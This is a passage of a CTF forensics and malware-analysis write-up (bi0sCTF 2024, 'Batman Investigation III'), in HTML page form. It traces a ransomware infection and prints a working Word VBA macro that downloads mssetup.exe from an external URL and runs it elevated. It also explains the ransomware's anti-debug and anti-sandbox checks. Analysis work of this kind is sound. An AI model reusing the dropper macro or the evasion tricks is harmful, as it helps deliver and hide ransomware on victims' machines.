@@ -1,0 +1,3439 @@
+<!doctype html>
+<html class="scroll-smooth" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      id="viewport"
+      content="width=device-width, initial-scale=1.0" />
+    <title>
+      Batman Investigation III - Th3 Sw0rd 0f Azr43l bi0sCTF 2024 Writeup | Azr43lkn1ght
+    </title><meta name="application-name" content="Azr43lkn1ght" />
+<meta name="apple-mobile-web-app-title" content="Azr43lkn1ght" />
+
+
+  <meta name="title" content="Batman Investigation III - Th3 Sw0rd 0f Azr43l bi0sCTF 2024 Writeup" />
+
+
+
+  <meta name="description" content="Full solution of Batman Investigation III - Th3 Sw0rd 0f Azr43l from bi0sctf 2024" />
+<meta name="theme-color" content="#ffffff" /><link rel="icon" href="/favicon.svg" /><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" /><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#ffffff" />
+
+
+
+
+  
+  <link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/instantsearch.css@8.0.0/themes/reset-min.css"
+    integrity="sha256-2AeJLzExpZvqLUxMfcs+4DWcMwNfpnjUeAAvEtPr0wU="
+    crossorigin="anonymous" />
+
+  
+  
+  
+  <link href="/css/search.css" rel="stylesheet" />
+
+
+
+
+
+
+
+
+
+
+
+<link href="/css/styles.css" rel="stylesheet" />
+
+<link href="/css/custom.css" rel="stylesheet" />
+  
+  
+  
+  <link href="/css/image-preview.css" rel="stylesheet" />
+
+  
+    
+    
+    
+    <link href="/css/syntax.css" rel="stylesheet" />
+  
+<script src="/js/third-party/flowbite/v2.2.1/flowbite.min.js" defer></script>
+<script>
+  
+  if (
+    localStorage.getItem("color-theme") === "dark" ||
+    (!("color-theme" in localStorage) &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches)
+  ) {
+    document.documentElement.classList.add("dark");
+  } else {
+    document.documentElement.classList.remove("dark");
+  }
+</script>
+
+  </head>
+  <body class="flex h-screen flex-col bg-white dark:bg-[#1b1f26]"><nav
+  id="navbar"
+  class="fixed start-0 top-0 z-20 flex w-full justify-center border-b border-gray-200 bg-white/85 backdrop-blur-md md:h-38 dark:border-gray-700 dark:bg-[#1b1f26]">
+  <div
+    class="mx-auto flex w-[1280px] flex-wrap items-center justify-between place-self-center object-center p-4">
+    
+    
+    <a
+      href="http://localhost:1313/"
+      class="flex items-center justify-start space-x-3 rtl:space-x-reverse">
+      
+      <p class="dark:text-primary rounded-full flex gap-3 items-center" style="font-size: 1.3rem">
+        <img src="https://raw.githubusercontent.com/Azr43lKn1ght/Azr43lKn1ght/main/h3LL.png" alt="logo" class="h-[50px] rounded-full" />
+        <b class="font-mono text-white hover:text-primary">Azr43lKn1ght</b>
+      </p></a>
+<div class="flex flex-col md:flex-row gap-6">
+    
+    <div class="flex items-center space-x-3 md:order-2 rtl:space-x-reverse">
+      
+      
+        <button
+          type="button"
+          id="search-icon"
+          class="bg-primary p-3 text-center text-sm font-medium text-white hover:bg-[#069096] focus:outline-none md:p-5 dark:bg-primary dark:hover:bg-[#069096]">
+          <svg
+            t="1702210633165"
+            class="icon"
+            viewBox="0 0 1024 1024"
+            version="1.1"
+            xmlns="http://www.w3.org/2000/svg"
+            p-id="4364"
+            width="16"
+            height="16">
+            <path
+              d="M426.666667 768a339.285333 339.285333 0 0 0 208.938666-72.021333l187.562667 187.562666 60.330667-60.330666-187.562667-187.562667A339.285333 339.285333 0 0 0 768 426.666667c0-188.202667-153.130667-341.333333-341.333333-341.333334s-341.333333 153.130667-341.333334 341.333334 153.130667 341.333333 341.333334 341.333333z m0-597.333333c141.184 0 256 114.816 256 256s-114.816 256-256 256-256-114.816-256-256 114.816-256 256-256z"
+              fill="#ffffff"
+              p-id="4365"></path>
+          </svg>
+        </button>
+      
+
+      
+      <button
+        data-collapse-toggle="navbar-sticky"
+        type="button"
+        class="inline-flex h-10 w-10 items-center justify-center p-2 text-sm text-gray-500 hover:bg-gray-100 focus:outline-none md:hidden dark:text-gray-400 dark:hover:bg-gray-700"
+        aria-controls="navbar-sticky"
+        aria-expanded="false">
+        <span class="sr-only">Open main menu</span>
+        <svg
+          class="h-5 w-5"
+          aria-hidden="true"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 17 14">
+          <path
+            stroke="currentColor"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M1 1h15M1 7h15M1 13h15" />
+        </svg>
+      </button>
+    </div>
+    <span class="flex items-center absolute md:relative top-[50px] md:top-0 right-0 left-0">
+      <div
+  class="hidden w-full items-center justify-between md:order-1 md:flex md:w-auto"
+  id="navbar-sticky">
+  <ul
+    class="mt-4 flex flex-col rounded-lg border border-gray-300 p-4 font-medium md:mt-0 md:flex-row md:space-x-8 md:border-0 md:p-0 rtl:space-x-reverse dark:border-gray-700 dark:bg-gray-900 md:dark:bg-transparent">
+    
+      <li>
+        
+          <a
+            aria-current="page"
+            class="block rounded-lg px-3 py-2 text-gray-900 hover:bg-gray-100 md:p-0 md:hover:bg-transparent md:hover:text-[#00adb5] dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 dark:hover:text-white md:dark:hover:bg-transparent md:dark:hover:text-[#00adb5]"
+            href="/">
+            
+            Home
+          </a>
+        
+      </li>
+    
+      <li>
+        
+          <a
+            aria-current="page"
+            class="block rounded-lg px-3 py-2 text-gray-900 hover:bg-gray-100 md:p-0 md:hover:bg-transparent md:hover:text-[#00adb5] dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 dark:hover:text-white md:dark:hover:bg-transparent md:dark:hover:text-[#00adb5]"
+            href="/posts/">
+            
+            Posts
+          </a>
+        
+      </li>
+    
+
+    
+      <button
+        id="dropdownNavbarLink-category"
+        data-dropdown-toggle="dropdownNavbar-category"
+        class="flex w-full items-center justify-between rounded-lg px-3 py-2 text-gray-900 hover:bg-gray-100 md:w-auto md:border-0 md:p-0 md:hover:bg-transparent md:hover:text-[#00adb5] dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 dark:focus:text-white md:dark:hover:bg-transparent md:dark:hover:text-[#00adb5]">
+        Category
+        <svg
+          class="ms-2.5 h-2.5 w-2.5"
+          aria-hidden="true"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 10 6">
+          <path
+            stroke="currentColor"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="m1 1 4 4 4-4" />
+        </svg>
+      </button>
+
+      <div
+        id="dropdownNavbar-category"
+        class="z-10 hidden w-44 divide-y divide-gray-100 rounded-lg bg-white font-normal shadow dark:divide-gray-600 dark:bg-gray-800">
+        <ul
+          class="py-2 text-sm text-gray-700 dark:text-gray-400"
+          aria-labelledby="dropdownLargeButton">
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/bi0sctf/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Bi0sCTF</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/ctf-writeups/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >CTF Writeups</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/dfir/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >DFIR</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/malware-analysis/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Malware Analysis</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/malware-development/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Malware Development</a
+              >
+            </li>
+          
+            <li>
+              <a
+                href="http://localhost:1313/categories/ransomware/"
+                class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white"
+                >Ransomware</a
+              >
+            </li>
+          
+        </ul>
+      </div>
+    
+  </ul>
+</div>
+</span>
+  </div>
+  </div>
+</nav>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    let navbarDom = document.getElementById("navbar");
+    let isNavScrolled = false;
+
+    if (window.innerWidth >= 768) {
+      navbarDom.classList.add("navbar-init");
+
+      var scrollTop = 0;
+
+      window.addEventListener("scroll", function () {
+        scrollTop = window.pageYOffset;
+
+        if (scrollTop >= 10 && !isNavScrolled) {
+          isNavScrolled = true;
+          navbarDom.classList.add("navbar-scroll");
+        } else if (scrollTop < 10 && isNavScrolled) {
+          isNavScrolled = false;
+          navbarDom.classList.remove("navbar-scroll");
+        }
+      });
+    } else {
+      navbarDom.classList.remove("navbar-init");
+    }
+  });
+</script>
+
+  
+
+  
+  
+    
+    
+      <div id="post-feature" class="mt-22 w-full md:mt-[151px]">
+        <img
+          class="h-60 w-full object-cover md:h-120"
+          src="http://localhost:1313/images/posts/6.jpg"
+          alt="preview image"
+          srcset="" />
+      </div>
+    
+  
+
+
+  <div
+    id="single-page-container"
+    class="mx-auto my-5 w-full rounded-b-lg px-5 md:max-w-6xl">
+    <div class="flex w-full justify-between">
+      
+      <div id="post-container" class="w-full flex-grow">
+        
+        <div
+          id="post-title"
+          data-popover-target="popover-animation"
+          data-popover-offset="0"
+          data-popover-placement="bottom"
+          class="flex flex-col py-5 pl-0 pr-1 md:py-8 md:pl-1 md:pr-3 lg:py-10 lg:pl-7 lg:pr-10">
+          <div
+            class="flex flex-row flex-wrap space-x-1 border-l-8 border-primary pb-2 pl-2 pt-1 font-Oswald text-sm font-normal tracking-wide text-gray-500/90 dark:text-gray-300">
+            <span>Posted by March 9 2024</span>
+
+            
+            
+            
+              <span class="flex flex-row space-x-1">
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/malware-analysis/"
+                    >Malware Analysis</a
+                  >
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/dfir/"
+                    >DFIR</a
+                  >
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/bi0sctf/"
+                    >Bi0sCTF</a
+                  >
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/ctf-writeups/"
+                    >CTF Writeups</a
+                  >
+                
+                  <span class="text-primary"> / </span>
+                  <a
+                    class="border-b-2 border-transparent hover:border-b-2 hover:border-primary hover:text-[#00adb5]"
+                    href="http://localhost:1313/categories/ransomware/"
+                    >Ransomware</a
+                  >
+                
+              </span>
+            
+
+          </div>
+          <div
+            class="border-l-8 border-primary py-1 pl-2 text-start text-3xl font-bold tracking-wide text-black lg:text-4xl dark:text-white">
+            Batman Investigation III - Th3 Sw0rd 0f Azr43l bi0sCTF 2024 Writeup
+          </div>
+
+          <div
+            class="flex flex-row flex-wrap items-center space-x-1 border-l-8 border-primary pb-1 pl-2 pt-3.5 font-Oswald text-xs font-extralight tracking-wide text-gray-500/90 dark:text-gray-300">
+            <span>Updated on March 9 2024</span>
+            <div
+              class="h-1 w-1 rounded-full bg-primary"></div>
+            <span>5686 words</span>
+            <div
+              class="h-1 w-1 rounded-full bg-primary"></div>
+            <span>27 minutes read</span>
+            
+              <div
+                class="h-1 w-1 rounded-full bg-primary"></div>
+              <p>
+                <span
+                  id="twikoo_visitors"
+                  class="page-info-pageview-count"
+                  data-path="/Batman%20Investigation%20III%20-%20Th3%20Sw0rd%200f%20Azr43l/"
+                  >...</span
+                >
+                visits
+              </p>
+            
+          </div>
+        </div>
+
+        
+        <div
+          id="single-content"
+          class="format mx-auto max-w-none px-1 py-5 md:format-base dark:format-invert format-figure:flex format-figure:flex-col format-figure:items-center format-img:cursor-zoom-in md:px-3 lg:px-10 dark:text-gray-300">
+          <p><strong>Challenge Points</strong>: 1000</p>
+<p><strong>No. of solves</strong>: 1</p>
+<p><strong>Challenge Author</strong>: 
+<a
+  href="https://twitter.com/Azr43lKn1ght"
+  
+    target="_blank"
+  
+  >Azr43lKn1ght</a
+>
+</p>
+<h3 class="group head-tag" id="challenge-description">Challenge Description:<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#challenge-description"></a></h3><p>Azrael the Archangel of Vengeance has joined the batfamily after destroying the machine of St Dumas defeating face to face against his most startling foe, the undying heirophant, the first son of St Dumas. The Dumas is not completely destroyed and the heirarchy out somewhere out, Jean Paul, our Azrael has a shared workspace with Duke Thomas, The signal. St Dumas got them now by sending the weapon of azrael but we got the attack process captured by signal as he was the one who let it in unknowingly. Azrael and Signal are trying to fix things to get back whatever is lost as well not get in the clutches of the order. They should now have to safegaurd batman&rsquo;s files as well as their own important ones. if they get it back before Dumas knowing they are getting close to finding them to stop the order as well the birth and training of new Azraels when they are waiting for negotiation or some plan to take our protagonists with hold of the recovery shard. Can you help them to recover from the loses and find the weapon of Azrael ,so they can take down the order of the St Dumas?</p>
+<p>File Password : <strong>E6qK~$9pUIk0kT'3&amp;N/Okt</strong></p>
+<p><strong>Challenge Files</strong>:</p>
+<ul>
+<li>
+<a
+  href="https://amritauniv-my.sharepoint.com/:u:/g/personal/inctfj_am_amrita_edu/ER1nPhaT_UZCsg1DxHupEVcBbng6-vCeUZ9ptj06aDbUJg?e=HB2RZY"
+  
+    target="_blank"
+  
+  >Primary Link</a
+>
+</li>
+<li>
+<a
+  href="https://www.dropbox.com/scl/fi/owrkj3du3zy8btbizm2tv/Chall_Images.zip?rlkey=dm7lbpeabc6jtdat58mt07ze9&amp;dl=0"
+  
+    target="_blank"
+  
+  >Mirror Link</a
+>
+</li>
+<li>nc link</li>
+</ul>
+<p><code>Flag format: bi0sctf{...}</code></p>
+<h3 class="group head-tag" id="solution">Solution<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#solution"></a></h3>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-1.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>We will first add the ad1 file as an evidence into ftk imager.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="question-1">Question 1<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-1"></a></h4><p>Q1) What is the PC name and timezone?
+Format: PC-name_Time-Zone-info</p>
+<p>we can find it from registry hives in windows/system32/config/</p>
+<p>we can find both the answers from SYSTEM/ROOT/ControlSet001/control/</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-3.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-2.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>DESKTOP-37SCR9U_GMT-Standard-time
+</code></pre><h4 class="group head-tag" id="question-2">Question 2<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-2"></a></h4><p>Q2) What is the name and hash of the initial infection file that drops the main malware?
+Format: Name_md5(file)</p>
+<p>so now we have to hunt for threats.</p>
+<p>looking into the timeline with logs, pf and other artefacts, we can see word was run.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-4.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>there was nothing in Users/DukeThomas/AppData/Roaming/Microsoft/Word/STARTUP</p>
+<p>but we can find .lnk in Users/DukeThomas/AppData/Roaming/Microsoft/Office/Recent which leads us to the recently opened files.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-5.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>And out of which Eula.docm seems suspicious.</p>
+<p>and the lnk file gives us the location of the file : \Users\DukeThomas\Eula.docm</p>
+<p>let&rsquo;s export it for analysis</p>
+<pre tabindex="0"><code>Flags        Filename
+-----------  -----------------------------------------------------------------
+OpX:MASI---- Eula.docm
+===============================================================================
+FILE: Eula.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls
+in file: word/vbaProject.bin - OLE stream: u&#39;VBA/ThisDocument&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO NewMacros.bas
+in file: word/vbaProject.bin - OLE stream: u&#39;VBA/NewMacros&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+Sub AutoOpen()
+    DownloadAndOpenFile
+End Sub
+
+Sub Document_Open()
+    DownloadAndOpenFile
+End Sub
+
+Sub DownloadAndOpenFile()
+    Dim url As String
+    Dim destinationPath As String
+    Dim shell As Object
+    url = &#34;https://download1076.mediafire.com/mjjs57bws5ngcVJRcUga28j9RuYxynGaiwQx3DQ0VgqblEMeVMkJeKDo7G77jmDb8YLLy_wlj8HLgv-1Nm-_dk3U4O7RSXM3DFqag4BwiI0COh6Usq5Xu8j9ImDYmDf6YnaEUPRfB5SwvO213LGTYKgRRMiZwyu2P1EA3kh6iRe4UdA/31a2ax8mintcrkp/mssetup.exe&#34;
+    destinationPath = Environ(&#34;TEMP&#34;) &amp; &#34;\mssetup.exe&#34;
+
+    &#39; Download the file
+    With CreateObject(&#34;MSXML2.ServerXMLHTTP&#34;)
+        .Open &#34;GET&#34;, url, False
+        .send
+        If .Status = 200 Then
+            With CreateObject(&#34;ADODB.Stream&#34;)
+                .Open
+                .Type = 1 &#39; Binary
+                .SaveToFile destinationPath, 2 &#39; Overwrite
+                .Close
+            End With
+
+            &#39; Open the downloaded file using Shell.Application
+            Set shell = CreateObject(&#34;Shell.Application&#34;)
+            shell.ShellExecute destinationPath, &#34;&#34;, &#34;&#34;, &#34;runas&#34;, 1
+        End If
+    End With
+End Sub
+
+
++------------+----------------------+-----------------------------------------+
+| Type       | Keyword              | Description                             |
++------------+----------------------+-----------------------------------------+
+| AutoExec   | AutoOpen             | Runs when the Word document is opened   |
+| AutoExec   | Document_Open        | Runs when the Word or Publisher         |
+|            |                      | document is opened                      |
+| Suspicious | Open                 | May open a file                         |
+| Suspicious | shell                | May run an executable file or a system  |
+|            |                      | command                                 |
+| Suspicious | ShellExecute         | May run an executable file or a system  |
+|            |                      | command                                 |
+| Suspicious | Shell.Application    | May run an application (if combined     |
+|            |                      | with CreateObject)                      |
+| Suspicious | Binary               | May read or write a binary file (if     |
+|            |                      | combined with Open)                     |
+| Suspicious | CreateObject         | May create an OLE object                |
+| Suspicious | ADODB.Stream         | May create a text file                  |
+| Suspicious | SaveToFile           | May create a text file                  |
+| Suspicious | Environ              | May read system environment variables   |
+| Suspicious | MSXML2.ServerXMLHTTP | May download files from the Internet    |
+| IOC        | https://download1076 | URL                                     |
+|            | .mediafire.com/mjjs5 |                                         |
+|            | 7bws5ngcVJRcUga28j9R |                                         |
+|            | uYxynGaiwQx3DQ0Vgqbl |                                         |
+|            | EMeVMkJeKDo7G77jmDb8 |                                         |
+|            | YLLy_wlj8HLgv-1Nm-_d |                                         |
+|            | k3U4O7RSXM3DFqag4Bwi |                                         |
+|            | I0COh6Usq5Xu8j9ImDYm |                                         |
+|            | Df6YnaEUPRfB5SwvO213 |                                         |
+|            | LGTYKgRRMiZwyu2P1EA3 |                                         |
+|            | kh6iRe4UdA/31a2ax8mi |                                         |
+|            | ntcrkp/mssetup.exe   |                                         |
+| IOC        | mssetup.exe          | Executable file name                    |
++------------+----------------------+-----------------------------------------+
+</code></pre><p>we can see it is actually suspicious and it is downloading a file from mediafire and running it.</p>
+<p>let&rsquo;s first answer the question.</p>
+<pre tabindex="0"><code>Eula.docm_c814d5d719bea855b4da9db1e1a67f0e
+</code></pre><h4 class="group head-tag" id="question-3">Question 3<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-3"></a></h4><p>Q3) What is the name and hash of the main infection file?
+Format: Name_md5(file)</p>
+<p>now, from the analysis of the macro , we know that it runs a file after downloading it in temp folder, let&rsquo;s have a look at the temp folder.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-6.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we can indeed see the file mssetup.exe as well its execution in the timeline.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-7.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>mssetup.exe_35133696c5d4aca60d65f59138810e4d
+</code></pre><h4 class="group head-tag" id="question-4">Question 4<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-4"></a></h4><p>Q4) When did the main infection file run?
+Format: DD-MM-YYYY-HH-MM</p>
+<p>as we see from the timeline or getting from logs, prefetch or other artefacts, we can see the execution time.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-8.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>21-02-2024-16-33
+</code></pre><h4 class="group head-tag" id="question-5">Question 5<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-5"></a></h4><p>Q5) What is the ip and port the malware is sending the decryption essential to?
+Format: ip:port</p>
+<p>so first let&rsquo;s start analysing the mssetup.exe file.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-9.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-12.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-10.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>using detect it easy we can see that it is packed with upx, let&rsquo;s unpack it</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-11.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>now let&rsquo;s check again</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-13.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-14.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>now it is pretty normal with sections and imports being normal, so we can start static analysis.</p>
+<h3 class="group head-tag" id="static-analysis">Static Analysis<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#static-analysis"></a></h3><p>we will start by looking into its strings</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-15.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we can note things like</p>
+<ul>
+<li>A ransom note looking text</li>
+<li>98238588864125956469313398338937</li>
+<li>Azr43l_README.txt</li>
+<li>C:\Windows\System32\winevt\Logs</li>
+<li>C:\Windows\PrefetchC:\Windows\Temp</li>
+<li>C:\Users\Public\Documents\Recent</li>
+<li>C:$Recycle.BinC:\Windows\Logs</li>
+<li>C:\Windows\System32\config</li>
+<li>C:\Windows\SoftwareDistribution</li>
+<li>USERNAME</li>
+<li>C:\UsersDownloadsDesktop0_o</li>
+<li>AppData\Roaming\Notepad++Documents168133</li>
+</ul>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-16.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we also see strings pertaining to chacha20, giving us a small idea on what this ransomware might entail</p>
+<p>Now we can load the binary into IDA</p>
+<h4 class="group head-tag" id="getting-to-main">Getting to main<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#getting-to-main"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-17.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>In a rust binary unlike the C/C++ binaries, the main is not actually a main, rather it passes the function pointer of main to another function called lang_start</p>
+<h4 class="group head-tag" id="anti-debug-check">Anti Debug Check<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#anti-debug-check"></a></h4><p>Now heading into the actual main we see,
+An IsDebuggerPresent call</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-18.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>to patch, we can easily either NOP out these bytes or convert the jnz to jz as such</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-19.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Now this would help us during our debugging session, if we need to step through this function</p>
+<h4 class="group head-tag" id="lastinputinfo">Lastinputinfo<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#lastinputinfo"></a></h4><p>Next we have this block of code between lines 123 - 130</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-20.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>looking into struct LASTINPUTINFO</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-21.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>As it says, we get a structure filled with the last input info</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-22.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>This function fills the dwTime field of the structure with the milliseconds (tick count) of the last input info. The milliseconds here are from the start of system_time</p>
+<p>Analysing the next block of code</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-23.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="gettickcount">GetTickCount()<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#gettickcount"></a></h4><p>We see GetTickCount() being called</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-24.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>As mentioned, it returns the number of milliseconds since the system was started,
+And that is being subtracted from the time the last input was taken and compared against 59999, and is evaluated true if greater. Ie it would be false if it is under 60000ms, 60000ms is 60s i.e 1 min. The malware checks if the computer was idle for the last minute, if it was idle, then it exits . This is one of the anti-sandboxing techniques.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-25.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>For the next block of code above, in the if condition we see it takes and fills a structure plii with the current cursor position and and then sleeps for 5 seconds, then measures the next cursor position and we can see a ‘mm_cmepeq_epi132’ , indicating a compare, thus these two measured cursor positions are compared and if it is the same then it is marked as True, at which point the malware exits and stops running as well.</p>
+<p>Once the if condition is cleared,</p>
+<p>in the block of code below</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-26.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>We see the use of a function “GetAsyncKeyState”</p>
+<h4 class="group head-tag" id="getasynckeystate">GetAsyncKeyState<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#getasynckeystate"></a></h4><p>We can look up the MSDN webpage associated to GetAsyncKeyState</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-27.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>As it mentions, it determines which key was pressed during the latest IO operation</p>
+<p>And we have GetAsyncKeyState(1) and GetAsyncKeyState(2)</p>
+<p>Where args 1 and 2 correspond to :</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-28.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Under the virtual 
+<a
+  href="https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes"
+  
+    target="_blank"
+  
+  >key_code</a
+>
+.</p>
+<p>We also see,</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-29.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Based on this we can see it keeps track of how many times left click was registered and how many times right click was registered in the variables v1 and v2 respectively.</p>
+<p>Now we understand that the malware won’t run or proceed further until and unless a particular amount of left and right clicks have been registered which in our case in
